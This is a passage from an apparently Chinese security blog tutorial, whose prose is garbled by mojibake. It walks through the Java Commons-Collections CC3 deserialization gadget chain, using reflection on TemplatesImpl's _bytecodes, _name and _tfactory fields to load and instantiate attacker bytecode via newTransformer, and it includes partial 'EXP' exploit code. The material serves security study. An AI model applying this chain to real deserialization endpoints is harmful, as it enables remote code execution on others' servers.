class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><p>å’ŒCC1ä¸CC6è¿™ä¸¤æ¡é“¾æ˜¯ç›´æ¥åœ¨é“¾çš„ä»£ç ä¸­æ‰§è¡Œä»»æ„ä»£ç ç›¸æ¯”ï¼Œ<strong>CC3æ˜¯é€šè¿‡åŠ¨æ€ç±»åŠ è½½æœºåˆ¶æ¥å®ç°è‡ªåŠ¨æ‰§è¡Œæ¶æ„ç±»çš„ä»£ç çš„</strong>ã€‚</p>
<p>å›é¡¾ä¸€ä¸‹(å¿˜å·®ä¸å¤šäº†)ï¼š</p>
<p>å®ä¾‹åŒ–ä¹‹å‰ï¼Œå¿…é¡»å…ˆåŠ è½½ç±»çš„å­—èŠ‚ç æ–‡ä»¶åˆ°å†…å­˜ä¸­ã€‚<code>java</code>ç±»åŠ è½½æ˜¯æŒ‡å°†ç±»çš„å­—èŠ‚ç æ–‡ä»¶åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¹¶è½¬æ¢æˆ JVM ä¸­çš„<strong>Class</strong>å¯¹è±¡çš„è¿‡ç¨‹ã€‚</p>
<p>åŠ è½½ç±»çš„è¿‡ç¨‹ä¸­ï¼Œä¼šç»å†ä¸‹åˆ—ä¸‰ä¸ªæ–¹æ³•çš„è°ƒç”¨ï¼š</p>
<p>(<code>ClassLoader</code> æ˜¯Javaä¸­çš„ç±»åŠ è½½å™¨)</p>
<p><img src="/img/cc301.png" srcset="/img/loading.gif" lazyload alt="cc301"></p>
<ul>
<li><code>loadClass</code> çš„ä½œç”¨æ˜¯ä»å·²åŠ è½½çš„ç±»ç¼“å­˜ã€çˆ¶åŠ è½½å™¨ç­‰ä½ç½®å¯»æ‰¾ç±»ï¼ˆè¿™é‡Œå®é™…ä¸Šæ˜¯åŒäº²å§”æ´¾æœºåˆ¶ï¼‰ï¼Œåœ¨å‰é¢æ²¡æœ‰æ‰¾åˆ°çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œ <code>findClass</code></li>
<li><code>findClass</code> çš„ä½œç”¨æ˜¯æ ¹æ®åŸºç¡€URLæŒ‡å®šçš„æ–¹å¼æ¥åŠ è½½ç±»çš„å­—èŠ‚ç ï¼Œå¯èƒ½ä¼šåœ¨æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿã€jaråŒ…æˆ–è¿œç¨‹httpæœåŠ¡å™¨ä¸Šè¯»å–å­—èŠ‚ç ï¼Œç„¶åäº¤ç»™ <code>defineClass</code></li>
<li><code>defineClass</code> çš„ä½œç”¨æ˜¯å¤„ç†å‰é¢ä¼ å…¥çš„å­—èŠ‚ç ï¼Œå°†å…¶å¤„ç†æˆçœŸæ­£çš„Javaç±»</li>
</ul>
<p>ä¸¾ä¸ªåˆ©ç”¨<code>defineClass</code>æ‰§è¡Œä»£ç çš„ä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method; <span class="hljs-comment">// å¯¼å…¥java.lang.reflectåŒ…ä¸­çš„Methodç±»</span><br><span class="hljs-keyword">import</span> java.util.Base64; <span class="hljs-comment">// å¯¼å…¥java.utilåŒ…ä¸­çš„Base64ç±»</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloDefineClass</span> &#123; <span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªåä¸ºHelloDefineClassçš„å…¬å…±ç±»</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123; <span class="hljs-comment">// å®šä¹‰ä¸€ä¸ªåä¸ºmainçš„å…¬å…±é™æ€æ–¹æ³•ï¼ŒæŠ›å‡ºExceptionå¼‚å¸¸</span><br>        <span class="hljs-comment">// è·å–ClassLoaderç±»çš„defineClassæ–¹æ³•ï¼Œå¹¶è®¾ç½®ä¸ºå¯è®¿é—®</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">defineClass</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>        defineClass.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// ä½¿ç”¨Base64ç±»è§£ç ç»è¿‡Base64ç¼–ç çš„å­—èŠ‚ç </span><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br><br>        <span class="hljs-comment">// è°ƒç”¨ClassLoaderç±»çš„defineClassæ–¹æ³•ï¼ŒåŠ¨æ€å®šä¹‰ä¸€ä¸ªç±»ï¼Œå¹¶å°†ç»“æœè½¬æ¢ä¸ºClasså¯¹è±¡</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="hljs-string">&quot;Hello&quot;</span>, code, <span class="hljs-number">0</span>, code.length);<br><br>        <span class="hljs-comment">// å®ä¾‹åŒ–å®šä¹‰çš„ç±»ï¼Œä¸å®ä¾‹åŒ–æ²¡æ³•è°ƒç”¨ä»£ç </span><br>        <span class="hljs-comment">//è¿™é‡Œç›´æ¥ç”¨çš„defineClassæ–¹æ³•ï¼Œå› ä¸ºå·²ç»çŸ¥é“è¦åŠ è½½çš„ç±»ã€å­—èŠ‚ç æ˜¯ä»€ä¹ˆäº†</span><br>        hello.newInstance();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼Œåœ¨ <code>defineClass()</code> è¢«è°ƒç”¨çš„æ—¶å€™ï¼Œç±»å¯¹è±¡æ˜¯ä¸ä¼šè¢«åˆå§‹åŒ–çš„ï¼Œåªæœ‰è¿™ä¸ªå¯¹è±¡æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€ å‡½æ•°ï¼Œåˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œã€‚è€Œä¸”ï¼Œå³ä½¿æˆ‘ä»¬å°†åˆå§‹åŒ–ä»£ç æ”¾åœ¨ç±»çš„staticå—ä¸­ï¼Œåœ¨ <code>defineClass()</code> æ—¶ä¹Ÿæ— æ³•è¢«ç›´æ¥è°ƒç”¨åˆ°ã€‚<strong>æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬è¦ä½¿ç”¨ <code>defineClass()</code> åœ¨ç›®æ ‡æœºå™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œéœ€è¦æƒ³åŠæ³•è°ƒç”¨æ„é€ å‡½æ•° <code>newInstance()</code>ã€‚</strong></p>
<p>å¯ä»¥å†çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><br><span class="hljs-comment">// å­˜æ”¾ä»£ç å—</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> staticVar;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> instanceVar;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;é™æ€ä»£ç å—&quot;</span>);<br>    &#125;<br><br>    &#123;<br>        System.out.println(<span class="hljs-string">&quot;æ„é€ ä»£ç å—&quot;</span>);<br>    &#125;<br><br>    Person()&#123;<br>        System.out.println(<span class="hljs-string">&quot;æ— å‚æ„é€ å™¨&quot;</span>);<br>    &#125;<br>    Person(<span class="hljs-type">int</span> instanceVar)&#123;<br>        System.out.println(<span class="hljs-string">&quot;æœ‰å‚æ„é€ å™¨&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">staticAction</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;é™æ€æ–¹æ³•&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/img/cc302.png" srcset="/img/loading.gif" lazyload alt="cc302"></p>
<p>è¿™é‡Œå¦‚æœæŠŠ<code>newclass.newInstance()</code>æ³¨é‡Šæ‰(å³åªåŠ è½½ä¸è¿›è¡Œå®ä¾‹åŒ–)ä¼šå‘ç°æ²¡æœ‰ä»»ä½•è¾“å‡ºã€‚</p>
<p>ä¸‹é¢å°±æ˜¯æ–‡ç« ä¸­çš„åˆ©ç”¨ç±»ï¼š</p>
<p>é¦–å…ˆï¼Œ<code>TemplatesImpl.java</code>ä¸‹å­˜åœ¨<code>defineClass</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Class <span class="hljs-title function_">defineClass</span><span class="hljs-params">(<span class="hljs-keyword">final</span> <span class="hljs-type">byte</span>[] b)</span> &#123;<br>        <span class="hljs-keyword">return</span> defineClass(<span class="hljs-literal">null</span>, b, <span class="hljs-number">0</span>, b.length);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>ä½†æ³¨æ„è¿™æ˜¯è¢«<code>default</code>ä¿®é¥°çš„ï¼Œç»§ç»­æ‰¾æœ‰æ²¡æœ‰åœ°æ–¹è°ƒç”¨äº†ä»–ï¼š</p>
<p><img src="/img/cc303.png" srcset="/img/loading.gif" lazyload alt="cc303"></p>
<p>åŒä¸€ä¸ªç±»ä¸‹çš„ <code>getTransletInstance()</code> æ–¹æ³•è°ƒç”¨äº† <code>defineTransletClasses()</code> æ–¹æ³•ï¼Œå¹¶ä¸”è¿™é‡Œæœ‰ä¸€ä¸ª <code>newInstance()</code> å®ä¾‹åŒ–çš„è¿‡ç¨‹ï¼Œå¦‚æœèƒ½èµ°å®Œè¿™ä¸ªå‡½æ•°é‚£ä¹ˆå°±èƒ½åŠ¨æ€æ‰§è¡Œä»£ç :</p>
<p><img src="/img/cc304.png" srcset="/img/loading.gif" lazyload alt="cc304"></p>
<p>è¿™é‡Œå¯èƒ½ä¼šæƒ³ï¼š</p>
<p>è¿™ä¸æ˜¯å¯¹<code>_class[_transletIndex].newInstance();</code>è°ƒç”¨<code>newInstance()</code>å—ï¼Ÿ</p>
<p>å¯ä»¥çœ‹çœ‹è¿™ä¸ªä¸œè¥¿æ˜¯ä¸ªå•¥ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>           _class[i] = loader.defineClass(_bytecodes[i]);<br></code></pre></td></tr></table></figure>



<p>ç„¶åå­˜åœ¨ä¸€ä¸ª<code>public</code>ä¿®é¥°çš„æ–¹æ³•ï¼š<code>newTransformer</code></p>
<p><img src="/img/cc305.png" srcset="/img/loading.gif" lazyload alt="cc305"></p>
<h4 id="å¦‚ä½•åˆ©ç”¨ï¼Ÿ"><a href="#å¦‚ä½•åˆ©ç”¨ï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ©ç”¨ï¼Ÿ"></a>å¦‚ä½•åˆ©ç”¨ï¼Ÿ</h4><p>æ ¹æ®ä¸Šé¢çš„åˆ†ææˆ‘ä»¬çŸ¥é“ï¼šæœ€ç»ˆç›®æ ‡å°±æ˜¯è°ƒç”¨<code>templates.java</code>ä¸‹çš„<code>newTransformer()</code>æ–¹æ³•</p>
<p>å¤§è‡´è°ƒç”¨é¡ºåºï¼š</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">TemplatesImpl templates = <span class="hljs-keyword">new</span> <span class="hljs-constructor">TemplatesImpl()</span>;<br>templates.<span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span>;  <br>newTransformer -&gt; getTransletInstance<br>    -&gt; define<span class="hljs-constructor">TransletClasses()</span> <span class="hljs-comment">//å¹¶ä¸”å­˜åœ¨å®ä¾‹åŒ–:</span><br>    -&gt; AbstractTranslet translet = (AbstractTranslet) _class<span class="hljs-literal">[<span class="hljs-identifier">_transletIndex</span>]</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>    æ³¨æ„ï¼š<br>    define<span class="hljs-constructor">TransletClasses()</span> -&gt;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>                _class<span class="hljs-literal">[<span class="hljs-identifier">i</span>]</span> = loader.define<span class="hljs-constructor">Class(<span class="hljs-params">_bytecodes</span>[<span class="hljs-params">i</span>])</span>;<br>                <span class="hljs-comment">//defineclassåªæ˜¯åŠ è½½ç±»æ²¡æœ‰æ‰§è¡Œï¼ŒåŠ è½½å®Œäº†æ‰§è¡Œæ‰èƒ½è§¦å‘ç±»çš„åŠ¨æ€åŠ è½½ï¼šæ¶æ„ä»£ç </span><br></code></pre></td></tr></table></figure>

<p>å…ˆçœ‹çœ‹è°ƒç”¨<code>getTransletInstance</code>ä¸‹çš„<code>defineTransletClasses()</code>å¾—æ»¡è¶³å•¥æ¡ä»¶ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> Translet <span class="hljs-title function_">getTransletInstance</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (_name == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br><br>            <span class="hljs-keyword">if</span> (_class == <span class="hljs-literal">null</span>) defineTransletClasses();<br></code></pre></td></tr></table></figure>

<ul>
<li><code>_name</code>ä¸º<code>null</code>ï¼Œåˆ™ç›´æ¥<code>return null</code></li>
<li><code>_classs</code> ä¸º<code>null</code>ï¼Œè°ƒç”¨ <code>newInstance()</code></li>
</ul>
<p>å…ˆçœ‹ä¸€çœ¼æ— å‚æ„é€ å‡½æ•°å§ï¼Œéƒ½æ€ä¹ˆèµ‹å€¼çš„ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">TemplatesImpl</span><span class="hljs-params">()</span> &#123; &#125; <span class="hljs-comment">//ç©ºçš„</span><br></code></pre></td></tr></table></figure>

<p>ç„¶åå†çœ‹çœ‹<code>defineTransletClasses()</code></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span><br>    <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br><br>    <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>    &#125; <span class="hljs-comment">//æ‰€ä»¥è¿™é‡Œ_bytecodeså¾—æ˜¯ç©ºçš„</span><br>    <br>    <span class="hljs-type">TransletClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> (TransletClassLoader)<br>        AccessController.doPrivileged(<span class="hljs-keyword">new</span> <span class="hljs-title class_">PrivilegedAction</span>() &#123;<br>            <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());<br>            &#125;<br>        &#125;);<span class="hljs-comment">//æ³¨æ„è¿™ä¸ª_tfactoryï¼Œä»–ä¸èƒ½ä¸ºç©º</span><br></code></pre></td></tr></table></figure>

<p>çœ‹å›¾çš„è¯æ–¹ä¾¿ç‚¹ï¼š(DBå¸ˆå‚…çš„å›¾)</p>
<p><img src="/img/cc306.png" srcset="/img/loading.gif" lazyload alt="cc306"></p>
<p>æ¥ä¸‹æ¥çœ‹çœ‹<code>defineTransletClasses</code>å¦‚ä½•åˆ©ç”¨ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; classCount; i++) &#123;<br>                _class[i] = loader.defineClass(_bytecodes[i]);<br></code></pre></td></tr></table></figure>

<p>çœ‹çœ‹è¿™ä¸ª<code>_bytecodes</code>è¯¥å¦‚ä½•å®šä¹‰ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">byte</span>[][] _bytecodes = <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure>

<p>è¿™æ²Ÿæ§½çš„æ˜¯ä¸ªäºŒç»´æ•°ç»„ï¼Œæ‰€ä»¥ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">bytecodefield</span> <span class="hljs-operator">=</span> temp1.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br><br>classfield.setAccessible(<span class="hljs-literal">true</span>);<br><br><span class="hljs-type">byte</span> [] byte1 =  Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Clac.class&quot;</span>));<br><br><span class="hljs-type">byte</span> [] [] evil = &#123;byte1&#125;;<br><br>bytecodefield.set(temp1,evil);<br></code></pre></td></tr></table></figure>

<p><code>defineTransletclasses</code>ä¸‹å­˜åœ¨å¦‚ä¸‹é™åˆ¶ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">defineTransletClasses</span><span class="hljs-params">()</span><br>        <span class="hljs-keyword">throws</span> TransformerConfigurationException &#123;<br><br>        <span class="hljs-keyword">if</span> (_bytecodes == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">ErrorMsg</span> <span class="hljs-variable">err</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorMsg</span>(ErrorMsg.NO_TRANSLET_CLASS_ERR);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerConfigurationException</span>(err.toString());<br>        &#125;<br>........<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransletClassLoader</span>(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());<br>                &#125;<br>            &#125;);<br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„<code>_tfactory</code>ç»ä¸èƒ½ä¸ºç©ºã€‚<code>_tfactory</code> çš„å€¼åœ¨ <code>TemplatesImpl</code> è¿™ä¸€ç±»ä¸­è¢«å®šä¹‰å¦‚ä¸‹ï¼Œå…³é”®å­—æ˜¯ <code>transient</code>ï¼Œè¿™é‡Œè¿›è¡Œäº†å­—æ®µåˆå§‹åŒ–ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> <span class="hljs-type">TransformerFactoryImpl</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br></code></pre></td></tr></table></figure>

<p>ä»–ä¸å…‰ä¸º<code>null</code>ï¼Œè€Œä¸”è¢«<code>transient</code>ä¿®é¥°ã€‚è¿™ä¸œè¥¿åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­éƒ½ä¸ä¼šè¢«ä¼ è¿›å»ã€‚ä¸è¿‡åœ¨<code>readObject</code>æ–¹æ³•ä¸­å·²ç»ç»™ä»–ä»˜äº†ä¸€ä¸ªå€¼ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span>  <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream is)</span><br>      <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br><span class="hljs-comment">//çœç•¥</span><br>        _tfactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>();<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>æ‰€ä»¥è¿™é‡Œä¸ç®¡ä»–å°±è¡Œï¼Œåæ­£åˆ°æ—¶å€™ååºåˆ—åŒ–ä¼šè‡ªåŠ¨ç»™ä¸ªå€¼ã€‚</p>
<p>å…ˆä¸ç€æ€¥åºåˆ—åŒ–ååºåˆ—åŒ–ï¼Œè°ƒç”¨<code>newTransformer</code>æ–¹æ³•çœ‹çœ‹èƒ½ä¸èƒ½æ‰“é€šã€‚æˆ‘ä»¬è¿™é‡Œåˆ©ç”¨åå°„å¾—ç»™ä»–èµ‹æˆreadObjectæ—¶çš„å€¼ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br>tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br>tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br></code></pre></td></tr></table></figure>

<p>æˆªæ­¢åˆ°ç›®å‰çš„EXP:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TemplatesImplEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);  <br> nameField.setAccessible(<span class="hljs-literal">true</span>);  <br> nameField.set(templates,<span class="hljs-string">&quot;Drunkbaby&quot;</span>);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);  <br> bytecodesField.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E://Calc.class&quot;</span>));  <br> <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;  <br> bytecodesField.set(templates,codes);  <br>  <br> <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);  <br> tfactoryField.setAccessible(<span class="hljs-literal">true</span>);  <br> tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> templates.newTransformer();  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä½†è¿™ä¸ªæ—¶å€™ä¼šæŠ¥ç©ºæŒ‡é’ˆé”™ï¼Œè§£å†³åŠæ³•(å‚è€ƒDBå¸ˆå‚…çš„å›¾)ï¼š</p>
<p><img src="/img/Debug.png" srcset="/img/loading.gif" lazyload alt="Debug"></p>
<ul>
